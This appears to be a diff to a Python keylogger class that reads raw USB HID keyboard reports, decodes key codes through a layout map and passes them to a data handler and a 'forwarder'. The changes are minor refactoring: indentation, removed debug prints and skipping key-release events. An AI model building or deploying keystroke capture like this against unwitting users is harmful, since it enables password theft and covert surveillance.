@@ -14,10 +14,10 @@ class KeyLogger:
     __slots__ = ["__devices", "data_handler", "__forwarder", "keyboard_layout"]
 
     def __init__(
-        self,
-        keyboard_layout: dict[int, list[int,int]],
-        data_handler: DataHandler,
-        forwarder: Forwarder,
+            self,
+            keyboard_layout: dict[int, list[int, int]],
+            data_handler: DataHandler,
+            forwarder: Forwarder,
     ) -> None:
         # get all USB Devices
         self.__devices: list[int, int] = self.get_devices()
@@ -47,7 +47,6 @@ class KeyLogger:
     def run(self, id_vendor: int = 0x1C4F, device_id: int = 0x008B):
         keyboard = hid.device()
         keyboard.open(id_vendor, device_id)
-        print(self.keyboard_layout)
         while True:
             try:
                 data = keyboard.read(8)  # Read an 8-byte HID report
@@ -62,7 +61,9 @@ class KeyLogger:
                 if data[0] == 2:
                     uppercase = True
                 try:
-                    print(self.keyboard_layout[str(key_code)])
+                    # release the key:
+                    if self.keyboard_layout[str(key_code)] == [None, None]:
+                        continue
                     offset: int = int((lambda u: u[0] if uppercase else u[1])(self.keyboard_layout[str(key_code)]))
                     if offset is None:
                         continue
